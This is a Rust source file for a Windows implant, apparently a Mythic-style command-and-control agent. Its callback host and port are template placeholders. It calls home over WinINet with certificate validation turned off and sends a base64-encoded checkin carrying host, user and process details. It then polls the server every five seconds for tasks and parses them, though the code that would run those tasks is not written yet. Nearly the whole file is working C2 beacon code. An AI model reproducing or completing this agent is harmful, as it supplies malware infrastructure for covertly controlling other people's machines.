//use serde_json::map::Values;
//use base64::engine;
use winapi::shared::minwindef::LPVOID;
//use winapi::shared::ntdef::LPCSTR;
use winapi::um::processthreadsapi::GetCurrentProcessId;
//use winapi::shared::ntdef::LPCSTR;
use winapi::um::synchapi::Sleep;
//use winapi::um::winbase::FormatMessageA;
use winapi::um::wininet::{HttpOpenRequestA, HttpSendRequestA, InternetCloseHandle, InternetConnectA, InternetOpenA, InternetQueryDataAvailable, InternetReadFile, INTERNET_FLAG_IGNORE_CERT_CN_INVALID, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, INTERNET_FLAG_NO_AUTH, INTERNET_FLAG_NO_CACHE_WRITE, INTERNET_FLAG_NO_UI, INTERNET_FLAG_PRAGMA_NOCACHE, INTERNET_FLAG_RELOAD, INTERNET_OPEN_TYPE_PRECONFIG, INTERNET_OPEN_TYPE_PROXY, INTERNET_SERVICE_HTTP};
//use winapi::um::winhttp::WINHTTP_FLAG_ASYNC;
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};
use winsafe::GetLastError;
//use core::slice::SlicePattern;
use std::ptr::{self, null, null_mut};
//use std::mem;
use std::ffi::CString;
use winapi::ctypes::c_void;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use serde_json::{json, Value};
//use serde_json::{Map, Value};
//use uuid::Uuid;
use base64::{engine::general_purpose, Engine};


fn update_json_value(json_object: &mut Value, key: &str, new_value: impl Into<Value>) {
    let key = key.to_string();
    if let Some(object) = json_object.as_object_mut() {
        object.insert(key, new_value.into());
    }
}

fn encode_string_to_base64(data: String) -> String{
    //init decoder/encoder
    let engine = general_purpose::STANDARD;
    let base64_data = engine.encode(data);
    //println!("{}", base64_data);
    base64_data
    
}


fn decode_base64_into_string(data: *mut c_void , length: u32) -> String{
    //init decoder/encoder
    let engine = general_purpose::STANDARD;

    // converting pointer into &str type
    let string = unsafe {std::slice::from_raw_parts(data as *const u8, length as usize)};
    let utf8_string = std::str::from_utf8(string).expect("not ble to convert into utf-8");

    //decoding &str output is vector
    let decoded_string_from_cc = engine.decode(utf8_string).expect("error in decoding received data from C2");

    //converting vector to String
    let convert_vecu32_bytesliceu8 = &decoded_string_from_cc;
    let final_decoded_result_from_cc = std::str::from_utf8(convert_vecu32_bytesliceu8).expect("not able to convert to tring slice");
    //println!("decoded string from c2: {}", final_decoded_result_from_cc);
    unsafe{VirtualFree(data, 0, MEM_RELEASE)};
    //converting to String 
    String::from(final_decoded_result_from_cc)
}

fn generating_checkin_data() ->String {
    let mut checkin_object = json!({
        "action":"checkin",
        "ip": "",
        "os":"Microsoft Windows NT 10.0.19045.0",
        "user":"smoke",
        "host":"DESKTOP-ERCDV1S",
        "pid":null,
        "uuid":"73579340-6d53-4d08-ba89-27581c51b6cc",
    });
    
    let uuid_str = String::from("%UUID%");
    let pid = unsafe{GetCurrentProcessId()};
    
    //update_json_value(&mut checkin_object, "ip", "%HOSTNAME%");
    //update_json_value(&mut checkin_object, "os", "Windows");
    //update_json_value(&mut checkin_object, "user", "smoke");
    //update_json_value(&mut checkin_object, "host", "DesktopA");
    //update_json_value(&mut checkin_object, "pid", pid);
    //update_json_value(&mut checkin_object, "uuid", uuid_str.clone());
  
    let checking_object_string = serde_json::to_string(&checkin_object).unwrap();
    
    //concatenate
    let checkin_data = format!("{}{}", uuid_str, checking_object_string);
    println!("{}", checkin_data);
    checkin_data
}

pub fn network()  {
    unsafe{

        let agent: String = String::from("payload version 1.0");
        let server_ip: CString = CString::new("%CALLBACK-HOST%").expect("CString::new failed");
        let panel_uri: CString = CString::new("data").expect("CString::new failed");
        let http_version: CString = CString::new("HTTP/1.1").expect("CString::new failed");
        let http_verb: CString = CString::new("POST").expect("CString::new failed");
        let proxy = "http=127.0.0.1:9090"; // Proxy server address
        let proxy_bypass = "<local>"; // Bypass proxy for local addresses       
        let _proxy_cstr = CString::new(proxy).expect("CString::new failed");
        let _proxy_bypass_cstr = CString::new(proxy_bypass).expect("CString::new failed");
        let mut uuid: String = String::new();
        // Headers string
        //let header = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
        let header = "%USER-AGENT%";
        let header_cstr = CString::new(header).expect("CString::new failed");
        let header_ptr = header_cstr.as_ptr();
        let mut bytes_to_read: u32 = 0;
        let callback_port = %CALLBACK-PORT%;

        //debug for proxy
        //let io_handle = InternetOpenA(agent.as_ptr() as *const i8, /*INTERNET_OPEN_TYPE_PRECONFIG*/INTERNET_OPEN_TYPE_PROXY, _proxy_cstr.as_ptr(),_proxy_bypass_cstr.as_ptr(), 0); //creates a session context to maintain details about the HTTP session

        let io_handle = InternetOpenA(agent.as_ptr() as *const i8, INTERNET_OPEN_TYPE_PRECONFIG, std::ptr::null() , std::ptr::null() , 0); //creates a session context to maintain details about the HTTP session

        if io_handle.is_null(){
            println!("[-] failed InternetOpenA API: {}", GetLastError());
        }
        

        /*loop*/ {
            let ic_handle = InternetConnectA(io_handle, server_ip.as_ptr() as *const i8, callback_port, ptr::null_mut(), ptr::null_mut(), INTERNET_SERVICE_HTTP, 0, 0);

            println!("[*] Error report from InternetConnectA API{}", GetLastError());


            if ic_handle != ptr::null_mut() {    
                let or_handle = HttpOpenRequestA(ic_handle, http_verb.as_ptr() , panel_uri.as_ptr(), http_version.as_ptr(), ptr::null_mut(), ptr::null_mut() , INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
                INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_AUTH |
                INTERNET_FLAG_NO_CACHE_WRITE |
                INTERNET_FLAG_NO_UI |
                INTERNET_FLAG_PRAGMA_NOCACHE |
                INTERNET_FLAG_RELOAD, 0 );
                println!("[*] Requesting for panel, {}", GetLastError());
            
                if !or_handle.is_null() {
                    
                    let checkin_data = generating_checkin_data();

                    /************************************* base64 encode starts**************************************** */
                    let base64_encoded_checkin_data = encode_string_to_base64(checkin_data);
                    let base64_cstr_data = CString::new(base64_encoded_checkin_data).expect("CString::new failed");
                    let base64_ptr_checkin_data = base64_cstr_data.as_ptr() as *mut c_void;
                    let checkin_data_len = base64_cstr_data.to_bytes().len() as u32;
                    /************************************* base64 encode ends**************************************** */

                    /***************************** Sending checkin data to panel starts *******************************/
                    let rslt = HttpSendRequestA(or_handle, header_ptr, header_cstr.to_bytes().len() as u32, base64_ptr_checkin_data,checkin_data_len);
                    if rslt == 0{
                        println!("[-] Failed to sends checkin data to beacon")
                    }
                    /***************************** Sending checkin data to panel ends *******************************/


                    /*************checking and reading only if anything is available to read from panel***************/
                    let _result: i32 = InternetQueryDataAvailable(or_handle,   &mut bytes_to_read, 0, 0);
                    if bytes_to_read != 0 {
                        println!("Bytes to read from panel is: {}",  bytes_to_read );
                        let mut bytes_read_from_c2: u32 = 0;
                        let command_c2:LPVOID = VirtualAlloc(std::ptr::null_mut(), bytes_to_read as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                        
                        InternetReadFile(or_handle, command_c2, bytes_to_read, &mut bytes_read_from_c2 as *mut u32);

                        /************************************ decoding base64 starts **********************************/
                        let received_decoded_data = decode_base64_into_string(command_c2, bytes_to_read);
                        println!("{}",received_decoded_data);
                        /************************************ decoding base64 starts **********************************/

                        // Working on data received from cc
                        let json_string_from_cc: &str = &received_decoded_data[36..];
                       
                        println!("{}", json_string_from_cc);
                        let json_from_cc: Value = serde_json::from_str(json_string_from_cc).expect("failed to convert string to json");
                        let new_uuid: String = String::from(json_from_cc["id"].as_str().unwrap_or("error in finding the uuid"));
                        uuid = new_uuid.clone();

                        let action_from_cc = json_from_cc["action"].as_str().unwrap_or("error in finding the action");
                        let status_from_cc = json_from_cc["status"].as_str().unwrap_or("error in finding the status");
                       
                        if action_from_cc.contains("checkin") && status_from_cc.contains("success"){
                            println!("checkin successfull for implant with new uuid from cc: {}", new_uuid);
                        }
                        //uuid = new_uuid.clone();
                        InternetCloseHandle(or_handle);
                        /***************************************************************************************************/
                    }
                    
                }    
                    /***************************** Sending getting_task request to panel starts *******************************/
                    
                    
                    
                    
                loop {
                    let or_handle = HttpOpenRequestA(ic_handle, http_verb.as_ptr() , panel_uri.as_ptr(), http_version.as_ptr(), ptr::null_mut(), ptr::null_mut() , INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
                    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_AUTH |
                    INTERNET_FLAG_NO_CACHE_WRITE |
                    INTERNET_FLAG_NO_UI |
                    INTERNET_FLAG_PRAGMA_NOCACHE |
                    INTERNET_FLAG_RELOAD, 0 );
                    println!("[*] Requesting for panel, {}", GetLastError());

                        
                    if !or_handle.is_null(){

                        let mut getting_task = json!({
                            "action":"get_tasking",
                            "tasking_size":-1,
                            //"socks":[],
                            //"rpfwd":[],
                            //"delegates":[],
                            //"interactive":[],
                            //"responses":[],
                        });
                        
                        update_json_value(&mut getting_task, "tasking_size", -1);

                        let getting_task_object_string = serde_json::to_string(&getting_task).unwrap();
                        
                        //concatenate
                        let get_task_data = format!("{}{}", uuid, getting_task_object_string);
                        println!("{}", get_task_data);
                        let getting_task_base64_encoded = encode_string_to_base64(get_task_data);
                        println!("{}", getting_task_base64_encoded);
                        let base64_cstr_data = CString::new(getting_task_base64_encoded).expect("CString::new failed");
                        let base64_ptr_task_data = base64_cstr_data.as_ptr() as *mut c_void;
                        let task_data_len = base64_cstr_data.to_bytes().len() as u32;
                        //println!("{:?}", or_handle);

                        // let mut teststring = String::from("MTg0ZTUwYmEtOTYyYi00NzczLWE4OTktNzM5MTE2YTAxZDU4eyJhY3Rpb24iOiJnZXRfdGFza2luZyIsInRhc2tpbmdfc2l6ZSI6LTEsInNvY2tzIjpbXSwicnBmd2QiOltdLCJkZWxlZ2F0ZXMiOltdLCJpbnRlcmFjdGl2ZSI6W10sInJlc3BvbnNlcyI6W119");
                        let rslt = HttpSendRequestA(or_handle, header_ptr, header_cstr.to_bytes().len() as u32, base64_ptr_task_data,task_data_len);
                        
                        //let rslt = HttpSendRequestA(or_handle, header_ptr, header_cstr.to_bytes().len() as u32, teststring.as_mut_ptr() as *mut c_void ,teststring.len() as u32);
                        
                        if rslt == 0{
                            println!("{}", GetLastError());
                            println!("[-] Failed to send getting task to panel");
                        }
                        //println!("{}", GetLastError());
                        println!("[+] sent getting task to panel {}",GetLastError());

                        /*************checking and reading only if anything is available to read from panel***************/
                        let _result: i32 = InternetQueryDataAvailable(or_handle,   &mut bytes_to_read, 0, 0);
                        println!("Bytes to read from panel is: {}",  bytes_to_read );
                        if bytes_to_read != 0 {
                            println!("Bytes to read from panel is: {}",  bytes_to_read );
                            let mut bytes_read_from_c2: u32 = 0;
                            let command_c2:LPVOID = VirtualAlloc(std::ptr::null_mut(), bytes_to_read as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                            
                            InternetReadFile(or_handle, command_c2, bytes_to_read, &mut bytes_read_from_c2 as *mut u32);

                            // /************************************ decoding base64 starts **********************************/
                            let received_decoded_data = decode_base64_into_string(command_c2, bytes_to_read);
                            println!("{}",received_decoded_data);
                            // /************************************ decoding base64 ends **********************************/

                            /************************************ Working on data received from cc *********************************/
                            let json_string_from_cc: &str = &received_decoded_data[36..];
                        
                            // println!("{}", json_string_from_cc);
                            //converting string to json object

                            

                            let json_from_cc: Value = serde_json::from_str(json_string_from_cc).expect("failed to convert string to json");
                            
                            // reading json object 
                            let action: String = String::from(json_from_cc["action"].as_str().unwrap_or("error in finding tasks"));
                            
                           if let Some(tasks) = json_from_cc.get("tasks"){
                                if let Some(task_array) = tasks.as_array() {
                                    for (index, task) in task_array.iter().enumerate() {
                                        let timestamp = task.get("timestamp").and_then(Value::as_u64).unwrap_or(0);
                                        let command = task.get("command").and_then(Value::as_str).unwrap_or("N/A");
                                        let parameters = task.get("parameters").and_then(Value::as_str).unwrap_or("N/A");
                                        let id = task.get("id").and_then(Value::as_str).unwrap_or("N/A");
                                        
                                        println!("Task {}:", index + 1);
                                        println!("  Timestamp: {}", timestamp);
                                        println!("  Command: {}", command);
                                        println!("  Parameters: {}", parameters);
                                        println!("  ID: {}", id);
                                    }
                                } 
                           }
                            println!("action: {}", action);
                            InternetCloseHandle(or_handle);
                            
                            /***************************************************************************************************/
                        }
                        InternetCloseHandle(or_handle);
                    }
                    Sleep(5000);
                }    /***************************** Sending checkin data to panel ends *******************************/
                 
            }
                InternetCloseHandle(ic_handle);  
        }
            //InternetCloseHandle(io_handle);
            Sleep(1000);
    }
}

    

        


        
        
        
        
        
        
        
        

